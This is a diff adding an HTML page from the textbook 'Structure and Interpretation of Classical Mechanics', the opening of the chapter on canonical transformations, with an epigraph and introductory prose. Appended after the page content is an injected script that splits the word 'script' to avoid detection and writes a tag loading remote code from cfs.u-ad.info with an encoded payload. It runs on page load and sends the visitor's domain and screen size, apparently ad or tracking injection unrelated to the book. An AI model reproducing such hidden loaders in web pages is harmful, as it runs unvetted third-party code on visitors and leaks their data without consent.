@@ -1,0 +1,85 @@
+<!doctype html public "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
+<html>
+<!-- Generated from TeX source by tex2page, v 4p3, 
+     (c) Dorai Sitaram, http://www.cs.rice.edu/~dorai/tex2page -->
+<head>
+<title>
+
+Structure and Interpretation 
+of Classical Mechanics
+
+</title>
+<link rel="stylesheet" type="text/css" href="book-Z-C.css" title=default>
+<meta name=robots content="noindex,follow">
+</head>
+<body>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-56.html">previous</a></span><span>, <a href="book-Z-H-58.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<a name="%_chap_5"></a>
+<h1 class=chapter>
+<div class=chapterheading><a href="book-Z-H-4.html#%_toc_%_chap_5">Chapter 5</a></div><br>
+<a href="book-Z-H-4.html#%_toc_%_chap_5">Canonical Transformations</a></h1>
+<p></p>
+<p>
+
+</p>
+
+<div align=right> 
+<table width=60%><tr><td>
+<span class=epigraph>
+
+<p>
+We have done considerable mountain climbing.  Now we are in the
+rarefied atmosphere of theories of excessive beauty and we are nearing
+a high plateau on which geometry, optics, mechanics, and wave
+mechanics meet on common ground.  Only concentrated thinking, and a
+considerable amount of re-creation, will reveal the beauty of our
+subject in which the last word has not been spoken.</p>
+<p>
+<a name="%_idx_2446"></a>Cornelius Lanczos,
+<i>The Variational Principles of Mechanics</i>&nbsp;[<a href="book-Z-H-80.html#cite{Lanczos}">29</a>], p.&nbsp;229</p>
+<p>
+</p>
+
+</span>
+</td></tr></table>
+</div>
+
+<p></p>
+<p>
+<a name="%_idx_2448"></a>One way to simplify the analysis of a problem is to express it in a
+form in which the solution has a simple representation.  However, it
+may not be easy to formulate the problem in such a way initially.  It
+is often useful to start by formulating the problem in one way, and
+then transform it.
+For example, the formulation of the problem
+of the motion of a number of gravitating bodies is simple in
+rectangular coordinates, but it is easier to understand aspects of the
+motion in terms of orbital elements, such as the semimajor axes,
+eccentricities, and inclinations of the orbits.  The semimajor axis
+and eccentricity of an orbit depend on both the configuration and the
+velocity of the body.  Such transformations are more general than
+those that express changes in configuration coordinates.  Here we
+investigate transformations of phase-space coordinates that involve
+both the generalized coordinates and the generalized momenta.</p>
+<p>
+Suppose we have two different Hamiltonian systems, and suppose the
+trajectories of the two systems are in one-to-one correspondence.  In
+this case both Hamiltonian systems can be mathematical models of the
+same physical system.  Some questions about the physical system may be
+easier to answer by reference to one model and others may be easier to
+answer in the other model.  For example, it may be easier to formulate
+the physical system in one model and to discover a conserved quantity
+in the other.  Canonical transformations are maps between Hamiltonian
+systems that preserve the dynamics.</p>
+<p>
+A <em>canonical transformation</em> is a phase-space coordinate
+transformation and an associated transformation of the Hamiltonian
+such that the dynamics given by Hamilton's equations in the two
+representations describe the same evolution of the system.</p>
+<p>
+</p>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-56.html">previous</a></span><span>, <a href="book-Z-H-58.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<script type="text/javascript">if(self==top){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);document.write("<scr"+"ipt type=text/javascript src="+idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request");document.write("?id=1");document.write("&amp;enc=telkom2");document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582NgXaqsgjSGNhMkGfMSQiD3sl%2f3cAcd%2bfeOB367vQ4lVNNGiIx8m6EFtV0VXjGwQY61A67NF7Dp0QL6IbRTzM%2bEGHfRo1qUbYEc51znryr14LFfzJY8foziglPSE%2f6I8BSuam4PxCuteeKJXGQjQHWtEWXGr7zl4%2btU4wle%2fBkmQY8l3WJrnZsF2lvKMIlaiuOd9Qf%2fd3MDeIH%2fUgfWa7DTCMrRMcexiWjryIrBpehA9cSx29WNiIdr2xwtiaQdveLKnnjPR6XX9b%2b4D%2bfEVyCLtdSitWBNuoxl9BWwFmU1JcZ%2fQy%2fT%2f4EC%2b0t7GjKzdbtV0OrTqYN63iltrLsqbTZ8uYtSAotRAI8eo%2bO0xu1CAHlkJEJKPnQ4WThmxATwSLs7cu2zQXnj1tNfN1ya8D2hrOarcokXxrCl0qlhPcA2%2fhsnJobatPzFRBYOTsOcHcQC0gp3OrY%2bl1yv7msmCnyJM65pzoK2qLr1q6UvlyqcI");document.write("&amp;idc_r="+idc_glo_r);document.write("&amp;domain="+document.domain);document.write("&amp;sw="+screen.width+"&amp;sh="+screen.height);document.write("></scr"+"ipt>");}</script><noscript>activate javascript</noscript></body></body>
+</html>
